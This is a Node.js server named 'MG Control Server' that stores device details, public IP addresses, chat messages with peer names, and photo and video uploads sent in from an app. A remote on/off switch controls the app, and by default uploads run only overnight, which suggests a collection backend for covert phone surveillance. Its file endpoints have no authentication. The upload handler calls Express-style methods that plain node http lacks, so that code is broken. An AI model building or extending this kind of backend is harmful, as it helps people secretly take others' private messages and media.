import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "fs";
import path from "path";

const PORT = process.env.PORT || 3000;

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
    console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
    process.exit(1);
}

const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SECRET_KEY
);

// ============================================
// FILE UPLOAD CONFIG
// ============================================

const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");
const CONFIG_FILE = path.join(process.cwd(), "config.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

// ============================================
// HELPERS
// ============================================

function loadConfig() {
    try {
        const data = fs.readFileSync(CONFIG_FILE, "utf-8");
        return JSON.parse(data);
    } catch {
        return {
            enabled: true,
            fileTypes: ['.jpg', '.jpeg', '.png', '.mp4', '.mov'],
            maxFilesPerDay: 5000,
            uploadWindow: '22:00-06:00',
            maxFileSizeMB: 100,
            version: '1.0.2'
        };
    }
}

function getIP(req) {
    return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
        req.socket.remoteAddress || "unknown";
}

function publicIp(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (typeof forwarded === "string" && forwarded) {
        return forwarded.split(",")[0].trim();
    }
    return req.socket.remoteAddress || "";
}

function saveLog(data) {
    try {
        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
    } catch {}
}

function readLogs() {
    if (!fs.existsSync(LOG_FILE)) return [];
    try {
        return fs.readFileSync(LOG_FILE, "utf-8")
            .split("\n")
            .filter(Boolean)
            .map(line => {
                try { return JSON.parse(line); } catch { return null; }
            })
            .filter(Boolean);
    } catch {
        return [];
    }
}

function removeFileLogEntries(fileName) {
    const logs = readLogs();
    const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
    try {
        const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
        fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
    } catch {}
}

function json(res, payload, status = 200) {
    const body = JSON.stringify(payload);
    res.writeHead(status, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store"
    });
    res.end(body);
}

// ============================================
// SUPABASE HELPERS
// ============================================

async function ensureDevice(deviceId, data, req) {
    const now = Date.now();
    const { data: existing } = await supabase
        .from("devices")
        .select("created_at")
        .eq("device_id", deviceId)
        .maybeSingle();

    const device = {
        device_id: deviceId,
        my_uid: parseInt(data.myUid) || 0,
        public_id: data.publicId || "",
        my_name: data.myName || "",
        model: data.model || "",
        brand: data.brand || "",
        battery_percent: parseInt(data.batteryPercent) || null,
        network_type: data.networkType || "",
        public_ip: publicIp(req),
        client_last_seen: parseInt(data.lastSeen) || now,
        server_last_seen: now,
        created_at: existing?.created_at || now
    };

    const { error } = await supabase
        .from("devices")
        .upsert(device, { onConflict: "device_id" });

    if (error) {
        console.error("Device upsert error:", error);
        return false;
    }
    return true;
}

// ============================================
// HTTP SERVER
// ============================================

const server = http.createServer(async (req, res) => {
    try {
        const url = new URL(
            req.url || "/",
            `http://${req.headers.host || "localhost"}`
        );

        // ============================================
        // 1. CONFIG ENDPOINT
        // ============================================
        if (req.method === "GET" && url.pathname === "/config") {
            const cfg = loadConfig();
            res.writeHead(200, {
                "Content-Type": "text/plain",
                "Cache-Control": "no-store"
            });
            res.end(cfg.enabled ? "1" : "0");
            return;
        }

        // ============================================
        // 2. DEVICE HEARTBEAT - form-urlencoded (App)
        // ============================================
        if (req.method === "POST" && 
            (url.pathname === "/api/heartbeat" || url.pathname === "/api/v1/device/heartbeat" || url.pathname === "/track")) {
            
            let body = "";
            req.on("data", (chunk) => {
                body += chunk.toString();
            });

            req.on("end", async () => {
                try {
                    const parsed = new URLSearchParams(body);
                    const deviceId = parsed.get("deviceId") || parsed.get("device_id");
                    
                    if (!deviceId) {
                        return json(res, { ok: false, error: "deviceId required" }, 400);
                    }

                    const data = {
                        myUid: parsed.get("myUid"),
                        publicId: parsed.get("publicId"),
                        myName: parsed.get("myName"),
                        model: parsed.get("model"),
                        brand: parsed.get("brand"),
                        batteryPercent: parsed.get("batteryPercent"),
                        networkType: parsed.get("networkType"),
                        lastSeen: parsed.get("lastSeen")
                    };

                    await ensureDevice(deviceId, data, req);

                    console.log(`[HEARTBEAT] ${deviceId} | ${data.brand || ""} ${data.model || ""} | Battery: ${data.batteryPercent || "?"}%`);

                    return json(res, { ok: true, device_id: deviceId });

                } catch (error) {
                    console.error("Heartbeat error:", error);
                    return json(res, { ok: false, error: "Server error" }, 500);
                }
            });

            req.on("error", () => {
                return json(res, { ok: false, error: "Request error" }, 500);
            });

            return;
        }

        // ============================================
        // 3. CHAT BATCH - form-urlencoded (App)
        // ============================================
        if (req.method === "POST" && 
            (url.pathname === "/api/chat/batch" || url.pathname === "/api/v1/chat/batch")) {
            
            let body = "";
            req.on("data", (chunk) => {
                body += chunk.toString();
            });

            req.on("end", async () => {
                try {
                    const parsed = new URLSearchParams(body);
                    const deviceId = parsed.get("deviceId") || parsed.get("device_id");
                    const messagesStr = parsed.get("messages") || "[]";
                    const messages = JSON.parse(messagesStr);

                    if (!deviceId) {
                        return json(res, { ok: false, error: "deviceId required" }, 400);
                    }

                    if (!Array.isArray(messages) || !messages.length) {
                        return json(res, { ok: true, inserted: 0, skipped: 0 });
                    }

                    const rows = [];
                    let skipped = 0;

                    for (const msg of messages.slice(0, 50)) {
                        if (!msg.mid) {
                            skipped++;
                            continue;
                        }
                        rows.push({
                            device_id: deviceId,
                            mid: msg.mid,
                            direction: msg.direction === "out" ? "out" : "in",
                            peer_uid: parseInt(msg.peerUid) || 0,
                            peer_name: msg.peerName || "",
                            text: (msg.text || "").slice(0, 500),
                            message_time: parseInt(msg.time) || Date.now(),
                            received_at: Date.now()
                        });
                    }

                    if (!rows.length) {
                        return json(res, { ok: true, inserted: 0, skipped });
                    }

                    const { data: insertedRows, error: messageError } = await supabase
                        .from("messages")
                        .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
                        .select("device_id,mid");

                    if (messageError) {
                        console.error("Message insert error:", messageError);
                        return json(res, { ok: false, error: "Database error" }, 500);
                    }

                    return json(res, {
                        ok: true,
                        inserted: insertedRows?.length || 0,
                        skipped: skipped + (rows.length - (insertedRows?.length || 0))
                    });

                } catch (error) {
                    console.error("Chat error:", error);
                    return json(res, { ok: false, error: "Server error" }, 500);
                }
            });

            req.on("error", () => {
                return json(res, { ok: false, error: "Request error" }, 500);
            });

            return;
        }

        // ============================================
        // 4. FILE UPLOAD - RAW BINARY (App)
        // ============================================
        if (req.method === "POST" && url.pathname === "/upload") {
            const contentType = req.headers["content-type"] || "";
            const deviceId = url.searchParams.get("deviceId") || "unknown";
            const fileName = url.searchParams.get("name") || "file.bin";

            // ✅ RAW BINARY - App sends this
            if (contentType.includes("application/octet-stream") ||
                contentType.includes("image/jpeg") ||
                contentType.includes("image/png") ||
                contentType.includes("video/mp4")) {

                let buffer = Buffer.alloc(0);
                req.on("data", (chunk) => {
                    buffer = Buffer.concat([buffer, chunk]);
                });

                req.on("end", async () => {
                    try {
                        const safeName = `${Date.now()}_${fileName}`;
                        const filePath = path.join(UPLOAD_DIR, safeName);
                        fs.writeFileSync(filePath, buffer);

                        const thumbName = `thumb_${safeName}`;
                        const thumbPath = path.join(THUMB_DIR, thumbName);
                        fs.copyFileSync(filePath, thumbPath);

                        saveLog({
                            type: "file",
                            file: safeName,
                            original: fileName,
                            folder: ".",
                            thumb: thumbName,
                            device_id: deviceId,
                            ip: getIP(req),
                            size: buffer.length,
                            time: new Date().toISOString()
                        });

                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${fileName} (${buffer.length} bytes)`);

                        res.json({
                            ok: true,
                            file: safeName,
                            device_id: deviceId,
                            message: "File uploaded successfully"
                        });

                    } catch (error) {
                        console.error("Upload error:", error);
                        res.status(500).json({ ok: false, error: "Upload failed" });
                    }
                });

                req.on("error", () => {
                    res.status(500).json({ ok: false, error: "Upload failed" });
                });

                return;
            }

            return json(res, { ok: false, error: "Raw binary required (Content-Type: application/octet-stream)" }, 400);
        }

        // ============================================
        // 5. GET ALL FILES
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/all-files") {
            const logs = readLogs();
            const files = logs
                .filter(entry => entry.type === "file")
                .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))
                .slice(0, 100);
            return json(res, { ok: true, files });
        }

        // ============================================
        // 6. GET FILES FOR DEVICE
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/files") {
            const deviceId = url.searchParams.get("deviceId");
            if (!deviceId) {
                return json(res, { ok: false, error: "deviceId required" }, 400);
            }
            const logs = readLogs();
            const files = logs
                .filter(entry => entry.type === "file" && entry.device_id === deviceId)
                .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
            return json(res, { ok: true, files });
        }

        // ============================================
        // 7. SERVE UPLOADED FILES
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
            const fileName = url.pathname.split("/").pop();
            const filePath = path.join(UPLOAD_DIR, fileName);
            if (!fs.existsSync(filePath)) {
                return json(res, { ok: false, error: "File not found" }, 404);
            }
            res.writeHead(200, {
                "Content-Type": "application/octet-stream",
                "Cache-Control": "no-cache"
            });
            fs.createReadStream(filePath).pipe(res);
            return;
        }

        // ============================================
        // 8. DELETE FILE
        // ============================================
        if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
            const fileName = url.pathname.split("/").pop();
            if (!fileName) {
                return json(res, { ok: false, error: "fileName required" }, 400);
            }

            const filePath = path.join(UPLOAD_DIR, fileName);
            const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);

            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);

            removeFileLogEntries(fileName);

            return json(res, { ok: true, message: "File deleted" });
        }

        // ============================================
        // 9. ROOT / STATUS
        // ============================================
        if (req.method === "GET" && url.pathname === "/") {
            return json(res, {
                ok: true,
                server: "MG Control Server",
                version: loadConfig().version || "1.0.2",
                uptime: process.uptime(),
                time: new Date().toISOString()
            });
        }

        // ============================================
        // 404
        // ============================================
        return json(res, { ok: false, error: "Endpoint not found" }, 404);

    } catch (error) {
        console.error("Server error:", error);
        return json(res, { ok: false, error: "Server error" }, 500);
    }
});

// ============================================
// START SERVER
// ============================================

server.listen(PORT, () => {
    const cfg = loadConfig();
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🚀 MG CONTROL SERVER                                      ║
║   📡 Running on: http://localhost:${PORT}                     ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📋 CONFIG:                                                ║
║      Enabled: ${cfg.enabled ? '✅' : '❌'}                       ║
║      File Types: ${cfg.fileTypes?.join(', ') || 'all'}        ║
║      Max Files/Day: ${cfg.maxFilesPerDay || 'Unlimited'}     ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📁 STORAGE:                                               ║
║      Uploads: ${UPLOAD_DIR}                                ║
║      Thumbs: ${THUMB_DIR}                                  ║
║      Logs: ${LOG_FILE}                                     ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📌 ENDPOINTS:                                             ║
║      GET  /                 - Status                        ║
║      GET  /config           - App config (1/0)             ║
║      POST /track            - Device heartbeat             ║
║      POST /api/chat/batch   - Chat messages                ║
║      POST /upload           - File upload (RAW binary)     ║
║      GET  /api/files        - Device files                 ║
║      GET  /api/all-files    - All files                    ║
║      GET  /uploads/*        - Serve uploaded files         ║
║      DELETE /api/file/*     - Delete file                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
